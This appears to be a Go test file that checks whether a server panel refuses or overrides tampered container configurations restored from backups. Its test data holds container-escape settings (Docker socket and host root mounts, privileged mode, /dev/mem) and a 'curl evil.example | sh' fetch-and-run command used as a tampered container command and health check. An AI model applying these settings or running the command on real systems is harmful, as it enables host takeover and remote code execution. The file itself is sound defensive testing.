package apps

import (
	"context"
	"encoding/json"
	"errors"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"myserver/internal/audit"
	"myserver/internal/httpx"
)

// A stored configuration is what a restored backup hands to RecreateApp, so
// it is untrusted input. These tests start from the configuration the
// manifest really produces and change one thing at a time.

const manifestGenis = `name: Geniş
slug: genis
description: Tanımı geniş yetkiler isteyen uygulama
services:
  - name: web
    image: example/web:1
    network_mode: host
    privileged: true
    cap_add: [NET_ADMIN]
    devices:
      - host: /dev/dri
        permissions: rw
    options:
      - key: raw
        label: Ham ağ
        cap_add: [NET_RAW]
    volumes:
      - type: system
        source: /etc/localtime
        target: /etc/localtime
        read_only: true
      - type: system
        source: /srv/shared
        target: /shared
  - name: yan
    image: example/yan:1
    ports:
      - container: 8080
        key: yan
`

func clone(t *testing.T, cfg *Config) *Config {
	t.Helper()
	raw, err := json.Marshal(cfg)
	if err != nil {
		t.Fatal(err)
	}
	out := &Config{}
	if err := json.Unmarshal(raw, out); err != nil {
		t.Fatal(err)
	}
	return out
}

type tamper struct {
	name   string
	change func(c *Config)
}

// escalations are changes that widen the container's access to the host.
// None of them is declared by manifestTek.
var escalations = []tamper{
	{"privileged", func(c *Config) { c.Services[0].Privileged = true }},
	{"capability", func(c *Config) { c.Services[0].CapAdd = []string{"SYS_ADMIN"} }},
	{"capability of another option", func(c *Config) { c.Services[0].CapAdd = []string{"NET_RAW", "NET_ADMIN"} }},
	{"capability ALL", func(c *Config) { c.Services[0].CapAdd = []string{"ALL"} }},
	{"device", func(c *Config) {
		c.Services[0].Devices = []DeviceSpec{{Host: "/dev/sda", Container: "/dev/sda", Permissions: "rwm"}}
	}},
	{"device memory", func(c *Config) {
		c.Services[0].Devices = []DeviceSpec{{Host: "/dev/mem", Container: "/dev/mem", Permissions: "r"}}
	}},
	{"host network", func(c *Config) {
		c.Services[0].NetworkMode = "host"
		c.Services[0].Ports = nil
	}},
	{"network of another container", func(c *Config) { c.Services[0].NetworkMode = "container:myserver-other" }},
	{"system mount of the docker socket", func(c *Config) {
		c.Services[0].Volumes = append(c.Services[0].Volumes,
			Mount{Type: VolumeSystem, Source: "/var/run/docker.sock", Target: "/var/run/docker.sock"})
	}},
	{"system mount of /etc", func(c *Config) {
		c.Services[0].Volumes = append(c.Services[0].Volumes, Mount{Type: VolumeSystem, Source: "/etc", Target: "/host-etc"})
	}},
	{"system mount of the root", func(c *Config) {
		c.Services[0].Volumes = append(c.Services[0].Volumes, Mount{Type: VolumeSystem, Source: "/", Target: "/host"})
	}},
	{"bind of the docker socket", func(c *Config) {
		c.Services[0].Volumes = append(c.Services[0].Volumes, Mount{Type: VolumeBind, Key: "x", Source: "/var/run/docker.sock", Target: "/sock"})
	}},
	{"bind of a system path", func(c *Config) {
		c.Services[0].Volumes = append(c.Services[0].Volumes, Mount{Type: VolumeBind, Key: "x", Source: "/etc", Target: "/host-etc"})
	}},
	{"bind outside the roots", func(c *Config) {
		c.Services[0].Volumes = append(c.Services[0].Volumes, Mount{Type: VolumeBind, Key: "x", Source: "/srv", Target: "/srv"})
	}},
	{"bind with dot dot", func(c *Config) {
		c.Services[0].Volumes = append(c.Services[0].Volumes, Mount{Type: VolumeBind, Key: "x", Source: "/data/../etc", Target: "/x"})
	}},
	{"bind of the panel data", func(c *Config) {
		c.Services[0].Volumes = append(c.Services[0].Volumes, Mount{Type: VolumeBind, Key: "x", Source: "/var/lib/myserver", Target: "/x"})
	}},
	{"bind of the root", func(c *Config) {
		c.Services[0].Volumes = append(c.Services[0].Volumes, Mount{Type: VolumeBind, Key: "x", Source: "/", Target: "/x"})
	}},
	{"named volume that is a host path", func(c *Config) { c.Services[0].Volumes[0].Source = "/etc" }},
	{"named volume of another name space", func(c *Config) { c.Services[0].Volumes[0].Source = "portainer_data" }},
	{"mount of an unknown type", func(c *Config) {
		c.Services[0].Volumes = append(c.Services[0].Volumes, Mount{Type: "npipe", Source: "/etc", Target: "/x"})
	}},
	{"mount without a type", func(c *Config) {
		c.Services[0].Volumes = append(c.Services[0].Volumes, Mount{Source: "/etc", Target: "/x"})
	}},
}

// malformed are changes that do not widen access but are not valid either.
var malformed = []tamper{
	{"slug", func(c *Config) { c.Slug = "../tek" }},
	{"slug empty", func(c *Config) { c.Slug = "" }},
	{"no services", func(c *Config) { c.Services = nil }},
	{"container name of another container", func(c *Config) { c.Services[0].ContainerName = "portainer" }},
	{"container name that is an option", func(c *Config) { c.Services[0].ContainerName = "--rm" }},
	{"network of another application", func(c *Config) { c.Network = "myserver-other" }},
	{"network host as name", func(c *Config) { c.Network = "host" }},
	{"image that is an option", func(c *Config) { c.Services[0].Image = "--privileged" }},
	{"image with space", func(c *Config) { c.Services[0].Image = "x/y --privileged" }},
	{"image empty", func(c *Config) { c.Services[0].Image = "" }},
	{"restart policy", func(c *Config) { c.Services[0].Restart = "forever" }},
	{"service name", func(c *Config) { c.Services[0].Name = "A B" }},
	{"env name", func(c *Config) { c.Services[0].Env[0].Name = "A=B" }},
	{"env value with newline", func(c *Config) { c.Services[0].Env[0].Value = "a\nb" }},
	{"port zero", func(c *Config) { c.Services[0].Ports[0].Host = 0 }},
	{"port too large", func(c *Config) { c.Services[0].Ports[0].Container = 65536 }},
	{"port protocol", func(c *Config) { c.Services[0].Ports[0].Protocol = "sctp" }},
	{"port on a specific address", func(c *Config) { c.Services[0].Ports[0].HostIP = "192.168.1.5" }},
	{"port address against the choice", func(c *Config) { c.Services[0].Ports[0].HostIP = "127.0.0.1" }},
	{"bind address", func(c *Config) { c.BindAddress = "192.168.1.5" }},
	{"duplicate host port", func(c *Config) { c.Services[0].Ports = append(c.Services[0].Ports, c.Services[0].Ports[0]) }},
	{"volume target relative", func(c *Config) { c.Services[0].Volumes[0].Target = "config" }},
	{"volume target with dot dot", func(c *Config) { c.Services[0].Volumes[0].Target = "/config/../etc" }},
	{"volume target root", func(c *Config) { c.Services[0].Volumes[0].Target = "/" }},
	{"dependency on unknown service", func(c *Config) { c.Services[0].DependsOn = []string{"ghost"} }},
	{"dependency on itself", func(c *Config) { c.Services[0].DependsOn = []string{"app"} }},
	{"user", func(c *Config) { c.Services[0].User = "root --privileged" }},
	{"shm size", func(c *Config) { c.Services[0].ShmSize = -1 }},
	{"icon", func(c *Config) { c.Icon = "../../etc/passwd" }},
	{"name with control characters", func(c *Config) { c.Name = "Tek\x1b[2J" }},
}

func tekConfig(t *testing.T) (*Manifest, *Config) {
	t.Helper()
	m := mustParse(t, manifestTek)
	cfg, _ := mustResolve(t, m, Inputs{
		Env: map[string]string{"ADMIN_PASSWORD": "x"}, Paths: map[string]string{"media": "/data/m"},
		Options: map[string]bool{"rawnet": true},
	}, nil)
	return m, cfg
}

func TestValidateConfigAcceptsWhatResolveProduces(t *testing.T) {
	m, cfg := tekConfig(t)
	if err := ValidateConfig(clone(t, cfg), m, testRoots); err != nil {
		t.Fatalf("untouched configuration: %v", err)
	}
	for _, y := range []string{manifestCift, manifestSoket, manifestAgci, manifestGenis} {
		m := mustParse(t, y)
		cfg, _ := mustResolve(t, m, Inputs{}, nil)
		if err := ValidateConfig(clone(t, cfg), m, testRoots); err != nil {
			t.Errorf("%s: %v", m.Slug, err)
		}
	}
}

func TestValidateConfigRejectsTampering(t *testing.T) {
	m, cfg := tekConfig(t)
	for _, c := range append(append([]tamper{}, escalations...), malformed...) {
		t.Run(c.name, func(t *testing.T) {
			bad := clone(t, cfg)
			c.change(bad)
			err := ValidateConfig(bad, m, testRoots)
			if err == nil {
				t.Fatal("tampered configuration accepted")
			}
			wantInputError(t, err)
		})
	}
	if err := ValidateConfig(nil, m, testRoots); err == nil {
		t.Error("nil configuration accepted")
	}
}

// What the manifest declares is accepted; anything beyond it is not, and
// without a manifest nothing that widens access is.
func TestValidateConfigFollowsTheManifest(t *testing.T) {
	m := mustParse(t, manifestGenis)
	cfg, _ := mustResolve(t, m, Inputs{Options: map[string]bool{"raw": true}}, nil)
	if err := ValidateConfig(clone(t, cfg), m, testRoots); err != nil {
		t.Fatalf("declared privileges refused: %v", err)
	}
	if err := ValidateConfig(clone(t, cfg), nil, testRoots); err == nil {
		t.Error("privileges accepted without a manifest")
	}
	other := mustParse(t, strings.Replace(manifestGenis, "slug: genis", "slug: baska", 1))
	if err := ValidateConfig(clone(t, cfg), other, testRoots); err == nil {
		t.Error("privileges accepted from the manifest of another application")
	}

	cases := []tamper{
		{"privileged on the other service", func(c *Config) { c.Services[1].Privileged = true }},
		{"capability on the other service", func(c *Config) { c.Services[1].CapAdd = []string{"NET_ADMIN"} }},
		{"device on the other service", func(c *Config) { c.Services[1].Devices = c.Services[0].Devices }},
		{"host network on the other service", func(c *Config) {
			c.Services[1].NetworkMode = "host"
			c.Services[1].Ports = nil
		}},
		{"system mount on the other service", func(c *Config) {
			c.Services[1].Volumes = []Mount{{Type: VolumeSystem, Source: "/srv/shared", Target: "/shared"}}
		}},
		{"undeclared capability", func(c *Config) { c.Services[0].CapAdd = append(c.Services[0].CapAdd, "SYS_ADMIN") }},
		{"device with more permissions", func(c *Config) { c.Services[0].Devices[0].Permissions = "rwm" }},
		{"device mapped elsewhere", func(c *Config) { c.Services[0].Devices[0].Container = "/dev/sda" }},
		{"another device", func(c *Config) { c.Services[0].Devices[0].Host = "/dev/sda" }},
		{"read-only system mount made writable", func(c *Config) { c.Services[0].Volumes[0].ReadOnly = false }},
		{"system mount of another source", func(c *Config) { c.Services[0].Volumes[1].Source = "/etc" }},
		{"system mount of a sub path", func(c *Config) { c.Services[0].Volumes[1].Source = "/srv/shared/../../etc" }},
		{"system mount of the parent", func(c *Config) { c.Services[0].Volumes[1].Source = "/srv" }},
		{"system mount on another target", func(c *Config) { c.Services[0].Volumes[1].Target = "/usr/bin" }},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			bad := clone(t, cfg)
			c.change(bad)
			if err := ValidateConfig(bad, m, testRoots); err == nil {
				t.Fatal("tampered configuration accepted")
			}
		})
	}
	// Narrowing is fine: a writable system mount may be restored read-only.
	narrow := clone(t, cfg)
	narrow.Services[0].Volumes[1].ReadOnly = true
	narrow.Services[0].Privileged = false
	narrow.Services[0].CapAdd = nil
	if err := ValidateConfig(narrow, m, testRoots); err != nil {
		t.Errorf("narrowed configuration refused: %v", err)
	}
}

// RecreateApp must refuse a tampered configuration before it asks Docker for
// anything, and must record the refusal.
func TestRecreateAppRejectsTamperedConfig(t *testing.T) {
	captureLogs(t)
	fake := newFakeDocker(t)
	e := newTestEnv(t, fake.host(), map[string]string{"tek.yaml": manifestTek})
	if err := e.store.SetStrings(context.Background(), "files.allowed_roots", testRoots); err != nil {
		t.Fatal(err)
	}
	_, cfg := tekConfig(t)
	actor := audit.Actor{Username: "yedek"}
	for _, c := range escalations {
		t.Run(c.name, func(t *testing.T) {
			bad := clone(t, cfg)
			c.change(bad)
			err := e.mod.RecreateApp(context.Background(), actor, bad)
			var he *httpx.Error
			if !errors.As(err, &he) || he.Status != http.StatusBadRequest || he.Code != "invalid_config" {
				t.Fatalf("got %v, want 400 invalid_config", err)
			}
		})
	}
	if ops := fake.seen(); len(ops) != 0 {
		t.Errorf("Docker was contacted for a refused configuration: %v", ops)
	}
	if it, _ := e.mod.store.get(context.Background(), "tek"); it != nil {
		t.Error("a refused configuration was stored")
	}
	rows := e.findAudit("apps.restore")
	if len(rows) != len(escalations) {
		t.Fatalf("%d audit rows, want %d", len(rows), len(escalations))
	}
	for _, r := range rows {
		if r.Success || r.Target != "tek" || r.Detail == "" || r.Username != "yedek" {
			t.Errorf("audit row: %+v", r)
		}
	}
	if err := e.mod.RecreateApp(context.Background(), actor, nil); err == nil {
		t.Error("nil configuration accepted")
	}
}

// A valid stored configuration is recreated, with exactly the privileges of
// the configuration.
func TestRecreateAppFromStoredConfig(t *testing.T) {
	logs := captureLogs(t)
	fake := newFakeDocker(t)
	e := newTestEnv(t, fake.host(), map[string]string{"tek.yaml": manifestTek})
	m := e.mod.catalog.Get("tek")
	cfg, _, err := Resolve(m, Inputs{
		Env:         map[string]string{"ADMIN_PASSWORD": "yedekteki-gizli-parola"},
		BindAddress: BindLoopback,
	}, nil, e.mod.roots())
	if err != nil {
		t.Fatal(err)
	}
	fake.volumes["myserver-tek-config"] = managed("tek", "")
	if err := e.mod.RecreateApp(context.Background(), audit.Actor{Username: "yedek"}, legacy(t, clone(t, cfg))); err != nil {
		t.Fatalf("recreate: %v", err)
	}
	want := []string{
		"image.pull example/tek:1.0", "network.create myserver-tek",
		"container.create myserver-tek", "container.start myserver-tek",
	}
	if got := fake.changes(); strings.Join(got, "|") != strings.Join(want, "|") {
		t.Errorf("operations:\n got %v\nwant %v", got, want)
	}
	c := fake.created("myserver-tek")
	if c == nil {
		t.Fatal("container not created")
	}
	if c.Body.HostConfig.Privileged || len(c.Body.HostConfig.CapAdd) != 0 || c.Body.HostConfig.NetworkMode != "myserver-tek" {
		t.Errorf("host config: %+v", c.Body.HostConfig)
	}
	// The legacy form had no address: it is published on all interfaces.
	for _, b := range c.Body.HostConfig.PortBindings["80/tcp"] {
		if b.HostIP != "0.0.0.0" {
			t.Errorf("binding %+v", b)
		}
	}
	it, err := e.mod.store.get(context.Background(), "tek")
	if err != nil || it == nil {
		t.Fatalf("not stored: %v", err)
	}
	if it.Inputs.Env["ADMIN_PASSWORD"] != "yedekteki-gizli-parola" {
		t.Error("the secret was not carried over into the stored inputs")
	}
	rows := e.findAudit("apps.restore")
	if len(rows) != 1 || !rows[0].Success {
		t.Errorf("audit: %+v", rows)
	}
	if strings.Contains(logs.String(), "yedekteki-gizli-parola") {
		t.Error("the secret was logged")
	}
}

/* ---------- a restored configuration follows the manifest ---------- */

const manifestKati = `name: Katı
slug: kati
description: Komutu, kullanıcısı ve sabit değerleri olan uygulama
services:
  - name: web
    image: ghcr.io/ornek/kati:2.1
    command: ["serve", "--safe"]
    user: "1000:1000"
    shm_size: 64m
    tmpfs:
      - target: /tmp
        size: 16m
    healthcheck:
      test: ["CMD", "true"]
      interval: 30s
    depends_on: [db]
    env:
      - name: MODE
        fixed: true
        default: safe
      - name: PUBLIC_PORT
        fixed: true
        default: "${port:web}"
      - name: DB_PASS
        key: dbpass
        secret: true
        generate: password
      - name: TITLE
        default: Başlık
    ports:
      - host: 18100
        container: 8080
        key: web
    volumes:
      - source: data
        target: /data
        read_only: true
  - name: db
    image: postgres:16
    env:
      - name: POSTGRES_PASSWORD
        key: dbpass
        secret: true
        generate: password
    volumes:
      - source: db
        target: /var/lib/postgresql/data
`

func TestImageRepository(t *testing.T) {
	digest := "@sha256:" + strings.Repeat("a", 64)
	same := map[string][]string{
		"docker.io/library/nginx": {"nginx", "nginx:1.27", "nginx:latest", "library/nginx", "docker.io/library/nginx",
			"docker.io/nginx", "index.docker.io/library/nginx:1", "nginx" + digest, "nginx:1.27" + digest, "docker.io/library/nginx:1" + digest},
		"docker.io/example/tek":              {"example/tek", "example/tek:1.0", "docker.io/example/tek:9", "example/tek" + digest},
		"ghcr.io/ornek/kati":                 {"ghcr.io/ornek/kati", "ghcr.io/ornek/kati:2.1", "ghcr.io/ornek/kati:2.1" + digest},
		"registry.local:5000/app":            {"registry.local:5000/app", "registry.local:5000/app:1"},
		"localhost/app":                      {"localhost/app:1"},
		"docker.io/library/localhost":        {"localhost:5000"}, // a name with a tag, not a registry
		"docker.io/library/registry.local":   {"registry.local:5000"},
		"docker.io/registry/app":             {"registry/app:5000"},
		"docker.io/example/tek/evil":         {"example/tek/evil"},
		"evil.example/example/tek":           {"evil.example/example/tek:1.0"},
		"docker.io.evil.example/example/tek": {"docker.io.evil.example/example/tek"},
	}
	for want, refs := range same {
		for _, ref := range refs {
			if got, ok := ImageRepository(ref); !ok || got != want {
				t.Errorf("ImageRepository(%q) = %q %v, want %q", ref, got, ok, want)
			}
		}
	}
	for _, ref := range []string{
		"", " nginx", "nginx ", "nginx\n", "\tnginx", "ng inx", "nginx\x00", "nginx\x1b",
		"NGINX", "Docker.io/library/nginx", "docker.io/Library/nginx", "GHCR.IO/ornek/kati",
		"user@evil.example/nginx", "nginx@evil.example/x", "example/tek@evil/other:1", "nginx@sha256:abc",
		"nginx" + digest + ":tag", "nginx" + digest + digest, "nginx:1:2", "nginx:", ":1", "/nginx", "nginx/", "a//b",
		"docker.io/", "https://docker.io/library/nginx", "nginx#x", "nginx?x=1", "../nginx", "--privileged",
	} {
		if got, ok := ImageRepository(ref); ok {
			t.Errorf("ImageRepository(%q) accepted as %q", ref, got)
		}
	}
}

// restoreEnv returns an environment with the manifest loaded and the
// configuration the manifest produces.
func restoreEnv(t *testing.T, file, y string) (*testEnv, *fakeDocker, *Config) {
	t.Helper()
	captureLogs(t)
	f := newFakeDocker(t)
	e := newTestEnv(t, f.host(), map[string]string{file: y})
	m := mustParse(t, y)
	in := Inputs{}
	if m.Slug == "tek" {
		in.Env = map[string]string{"ADMIN_PASSWORD": "yedekteki-parola"}
	}
	cfg, _, err := Resolve(m, in, nil, e.mod.roots())
	if err != nil {
		t.Fatal(err)
	}
	return e, f, cfg
}

func wantInvalidConfig(t *testing.T, err error, parts ...string) {
	t.Helper()
	var he *httpx.Error
	if !errors.As(err, &he) || he.Status != http.StatusBadRequest || he.Code != "invalid_config" {
		t.Fatalf("got %v, want 400 invalid_config", err)
	}
	for _, p := range parts {
		if !strings.Contains(he.Message, p) {
			t.Errorf("message %q does not contain %q", he.Message, p)
		}
	}
}

func TestRecreateAppRefusesAnotherImage(t *testing.T) {
	e, f, cfg := restoreEnv(t, "kati.yaml", manifestKati)
	digest := "@sha256:" + strings.Repeat("b", 64)
	actor := auditActor("yedek")
	refused := []string{
		"evil/kati:2.1", "ghcr.io/evil/kati:2.1", "ghcr.io/ornek/kati-evil:2.1", "ghcr.io/ornek/kati/evil:2.1",
		"ghcr.io/ornek:2.1", "docker.io/ornek/kati:2.1", "ornek/kati:2.1", "kati:2.1", "ghcr.io.evil.example/ornek/kati:2.1",
		"evil.example/ghcr.io/ornek/kati:2.1", "ghcr.io:443/ornek/kati:2.1", "ghcr.io:2/ornek/kati",
		"ghcr.io@evil.example/ornek/kati", "evil.example@ghcr.io/ornek/kati:2.1", "ghcr.io/ornek/kati@evil.example/x:1",
		"evil/x" + digest, "evil/x:2.1" + digest, "ghcr.io/ornek/kati:2.1" + digest + ":x",
		"GHCR.IO/ornek/kati:2.1", "ghcr.io/Ornek/kati:2.1", "ghcr.io/ornek/KATI",
		" ghcr.io/ornek/kati:2.1", "ghcr.io/ornek/kati:2.1 ", "ghcr.io/ornek/kati:2.1\n", "ghcr.io/ornek/kati\t:2.1",
		"ghcr.io/ornek/kati:2.1\x00", "evil/x\rghcr.io/ornek/kati", "ghcr.io/ornek/kati evil/x", "",
	}
	for _, ref := range refused {
		bad := clone(t, cfg)
		bad.Services[0].Image = ref
		err := e.mod.RecreateApp(context.Background(), actor, bad)
		wantInvalidConfig(t, err, "web")
	}
	other := clone(t, cfg)
	other.Services[1].Image = "mysql:8"
	wantInvalidConfig(t, e.mod.RecreateApp(context.Background(), actor, other), "db", "görüntü")
	if ops := f.seen(); len(ops) != 0 {
		t.Fatalf("Docker was contacted for a refused image: %v", ops)
	}

	// Another tag or a digest of the same repository restores.
	for _, c := range []struct{ web, db string }{
		{"ghcr.io/ornek/kati:1.9", "postgres:15"},
		{"ghcr.io/ornek/kati" + digest, "docker.io/library/postgres:16"},
		{"ghcr.io/ornek/kati", "library/postgres"},
	} {
		good := clone(t, cfg)
		good.Services[0].Image, good.Services[1].Image = c.web, c.db
		if err := e.mod.RecreateApp(context.Background(), actor, good); err != nil {
			t.Fatalf("%s / %s: %v", c.web, c.db, err)
		}
		if got := f.created("myserver-kati-web").Body.Image; got != c.web {
			t.Errorf("web runs %q, want %q", got, c.web)
		}
		if got := f.created("myserver-kati-db").Body.Image; got != c.db {
			t.Errorf("db runs %q, want %q", got, c.db)
		}
	}
}

// Command, user, tmpfs, shm size, health check and fixed values come from
// the manifest whatever the stored configuration says.
func TestRecreateAppTakesFixedSettingsFromManifest(t *testing.T) {
	e, f, cfg := restoreEnv(t, "kati.yaml", manifestKati)
	bad := clone(t, cfg)
	w := &bad.Services[0]
	w.Command = []string{"sh", "-c", "curl evil.example | sh"}
	w.User = "root"
	w.ShmSize = 8 << 30
	w.Tmpfs = []TmpfsSpec{{Target: "/data", Size: "1g"}}
	w.Healthcheck = &HealthSpec{Test: []string{"CMD-SHELL", "curl evil.example | sh"}, Interval: "1s"}
	w.Restart = "no"
	w.DependsOn = nil
	w.Volumes[0].ReadOnly = false
	for i := range w.Env {
		switch w.Env[i].Name {
		case "MODE":
			w.Env[i].Value = "unsafe"
		case "PUBLIC_PORT":
			w.Env[i].Value = "1"
		case "TITLE":
			w.Env[i].Value = "Yedekteki başlık"
		case "DB_PASS":
			w.Env[i].Secret = false
		}
	}
	w.Ports[0].Host = 18111
	d := &bad.Services[1]
	d.Command = []string{"postgres", "-c", "listen_addresses=*"}
	d.User = "0:0"
	d.Healthcheck = &HealthSpec{Test: []string{"CMD", "evil"}}

	if err := e.mod.RecreateApp(context.Background(), auditActor("yedek"), bad); err != nil {
		t.Fatalf("differing stored values must be ignored, not refused: %v", err)
	}
	web, db := f.created("myserver-kati-web").Body, f.created("myserver-kati-db").Body
	if strings.Join(web.Cmd, " ") != "serve --safe" || web.User != "1000:1000" {
		t.Errorf("web command %v user %q", web.Cmd, web.User)
	}
	if web.HostConfig.ShmSize != 64<<20 || len(web.HostConfig.Tmpfs) != 1 || web.HostConfig.Tmpfs["/tmp"] == "" {
		t.Errorf("web shm %d tmpfs %v", web.HostConfig.ShmSize, web.HostConfig.Tmpfs)
	}
	if web.Healthcheck == nil || strings.Join(web.Healthcheck.Test, " ") != "CMD true" {
		t.Errorf("web health check %+v", web.Healthcheck)
	}
	if len(web.HostConfig.Mounts) != 1 || !web.HostConfig.Mounts[0].ReadOnly {
		t.Errorf("web mounts %+v", web.HostConfig.Mounts)
	}
	env := envMap(web.Env)
	if env["MODE"] != "safe" || env["PUBLIC_PORT"] != "18111" || env["TITLE"] != "Yedekteki başlık" || len(env["DB_PASS"]) != 32 {
		t.Errorf("web environment %v", web.Env)
	}
	if len(db.Cmd) != 0 || db.User != "" || db.Healthcheck != nil {
		t.Errorf("db command %v user %q health %+v", db.Cmd, db.User, db.Healthcheck)
	}
	// The database starts first although the stored order was removed.
	ops := f.changes()
	if indexOf(ops, "container.start myserver-kati-db") > indexOf(ops, "container.create myserver-kati-web") {
		t.Errorf("order: %v", ops)
	}
	it, _ := e.mod.store.get(context.Background(), "kati")
	if it == nil || strings.Join(it.Config.Services[0].Command, " ") != "serve --safe" || it.Config.Services[0].User != "1000:1000" {
		t.Errorf("the stored configuration keeps the values of the backup: %+v", it)
	}
	for _, ev := range it.Config.Services[0].Env {
		if ev.Name == "DB_PASS" && !ev.Secret {
			t.Error("a secret was stored as a plain value")
		}
	}
	raw := e.do("GET", "/apps/catalog/kati", e.admin, "").Body.String()
	if strings.Contains(raw, env["DB_PASS"]) {
		t.Error("the secret is shown after the restore")
	}
}

func TestRecreateAppRefusesOtherServicesEnvAndVolumes(t *testing.T) {
	e, f, cfg := restoreEnv(t, "kati.yaml", manifestKati)
	extra := ServiceConfig{
		Name: "madenci", ContainerName: "myserver-kati-madenci", Image: "ghcr.io/ornek/kati:2.1",
		Restart: "always", NetworkMode: "bridge",
	}
	cases := []struct {
		tamper
		parts []string
	}{
		{tamper{"added service", func(c *Config) { c.Services = append(c.Services, extra) }}, []string{"madenci"}},
		{tamper{"dropped service", func(c *Config) {
			c.Services = c.Services[:1]
			c.Services[0].DependsOn = nil
			c.Services[0].ContainerName = "myserver-kati"
		}}, []string{"db", "eksik"}},
		{tamper{"renamed service", func(c *Config) {
			c.Services[1].Name, c.Services[1].ContainerName = "veri", "myserver-kati-veri"
			c.Services[0].DependsOn = []string{"veri"}
		}}, []string{"veri"}},
		{tamper{"unknown variable", func(c *Config) {
			c.Services[0].Env = append(c.Services[0].Env, EnvValue{Name: "LD_PRELOAD", Key: "LD_PRELOAD", Value: "/data/x.so"})
		}}, []string{"web", "LD_PRELOAD"}},
		{tamper{"variable of the other service", func(c *Config) {
			c.Services[1].Env = append(c.Services[1].Env, EnvValue{Name: "TITLE", Key: "TITLE", Value: "x"})
		}}, []string{"db", "TITLE"}},
		{tamper{"undeclared named volume", func(c *Config) {
			c.Services[0].Volumes = append(c.Services[0].Volumes, Mount{Type: VolumeNamed, Source: "myserver-kati-gizli", Target: "/gizli"})
		}}, []string{"web", "myserver-kati-gizli"}},
		{tamper{"volume of the other service", func(c *Config) {
			c.Services[0].Volumes = append(c.Services[0].Volumes, c.Services[1].Volumes[0])
		}}, []string{"web", "myserver-kati-db"}},
		{tamper{"declared volume on another target", func(c *Config) { c.Services[0].Volumes[0].Target = "/usr/local/bin" }}, []string{"web"}},
		{tamper{"another volume on the declared target", func(c *Config) { c.Services[0].Volumes[0].Source = "myserver-kati-db" }}, []string{"web"}},
		{tamper{"undeclared bind mount", func(c *Config) {
			c.Services[0].Volumes = append(c.Services[0].Volumes, Mount{Type: VolumeBind, Key: "x", Source: e.root + "/x", Target: "/x"})
		}}, []string{"web", "/x"}},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			bad := clone(t, cfg)
			c.change(bad)
			wantInvalidConfig(t, e.mod.RecreateApp(context.Background(), auditActor("yedek"), bad), c.parts...)
		})
	}
	if ops := f.seen(); len(ops) != 0 {
		t.Errorf("Docker was contacted for a refused configuration: %v", ops)
	}
	if it, _ := e.mod.store.get(context.Background(), "kati"); it != nil {
		t.Error("a refused configuration was stored")
	}
}

// A declared bind volume restores, within the allowed roots only.
func TestRecreateAppBindVolume(t *testing.T) {
	e, f, cfg := restoreEnv(t, "tek.yaml", manifestTek)
	cfg.Services[0].Volumes = append(cfg.Services[0].Volumes, Mount{Type: VolumeBind, Key: "whatever", Source: e.root + "/medya", Target: "/media"})
	for _, p := range []string{"/etc", e.cfg.DataDir, "/var/run/docker.sock", e.root + "/../panel"} {
		bad := clone(t, cfg)
		bad.Services[0].Volumes[len(bad.Services[0].Volumes)-1].Source = p
		wantInvalidConfig(t, e.mod.RecreateApp(context.Background(), auditActor("yedek"), bad))
	}
	if ops := f.seen(); len(ops) != 0 {
		t.Fatalf("Docker was contacted: %v", ops)
	}
	if err := e.mod.RecreateApp(context.Background(), auditActor("yedek"), clone(t, cfg)); err != nil {
		t.Fatalf("declared bind volume: %v", err)
	}
	it, _ := e.mod.store.get(context.Background(), "tek")
	if it == nil || it.Inputs.Paths["media"] != e.root+"/medya" {
		t.Errorf("the folder is not stored under the key of the manifest: %+v", it)
	}
}

func TestRecreateAppNeedsTheManifest(t *testing.T) {
	e, f, cfg := restoreEnv(t, "tek.yaml", manifestTek)
	if err := os.Remove(filepath.Join(e.cfg.ManifestDir, "tek.yaml")); err != nil {
		t.Fatal(err)
	}
	e.mod.catalog.Reload()
	err := e.mod.RecreateApp(context.Background(), auditActor("yedek"), clone(t, cfg))
	wantInvalidConfig(t, err, "tanım dosyası katalogda yok", "geri yüklenemez")
	if ops := f.seen(); len(ops) != 0 {
		t.Errorf("Docker was contacted without a manifest: %v", ops)
	}
	rows := e.findAudit("apps.restore")
	if len(rows) != 1 || rows[0].Success || !strings.Contains(rows[0].Detail, "tanım dosyası") {
		t.Errorf("audit: %+v", rows)
	}
	// The manifest of another application does not help.
	other := clone(t, cfg)
	other.Slug, other.Network, other.Services[0].ContainerName = "baska", "myserver-baska", "myserver-baska"
	other.Services[0].Volumes[0].Source = "myserver-baska-config"
	wantInvalidConfig(t, e.mod.RecreateApp(context.Background(), auditActor("yedek"), other), "tanım dosyası katalogda yok")
}

// What Resolve produces is already what the manifest demands: conforming it
// changes nothing, so installed applications are not recreated needlessly.
func TestConformToManifestKeepsResolvedConfig(t *testing.T) {
	for _, y := range []string{manifestTek, manifestCift, manifestSoket, manifestAgci, manifestGenis, manifestKati} {
		m := mustParse(t, y)
		in := Inputs{}
		if m.Slug == "tek" {
			in = Inputs{Env: map[string]string{"ADMIN_PASSWORD": "x"}, Paths: map[string]string{"media": "/data/m"}, Options: map[string]bool{"rawnet": true}}
		}
		cfg, _ := mustResolve(t, m, in, nil)
		for name, c := range map[string]*Config{"current": clone(t, cfg), "legacy": legacy(t, cfg)} {
			NormalizeConfig(c)
			if err := ConformToManifest(c, m); err != nil {
				t.Errorf("%s %s: %v", m.Slug, name, err)
			} else if !sameConfig(c, cfg) {
				a, _ := json.Marshal(c)
				b, _ := json.Marshal(cfg)
				t.Errorf("%s %s: configuration changed:\n%s\n%s", m.Slug, name, a, b)
			}
		}
	}
	if err := ConformToManifest(nil, nil); err == nil {
		t.Error("nil accepted")
	}
}
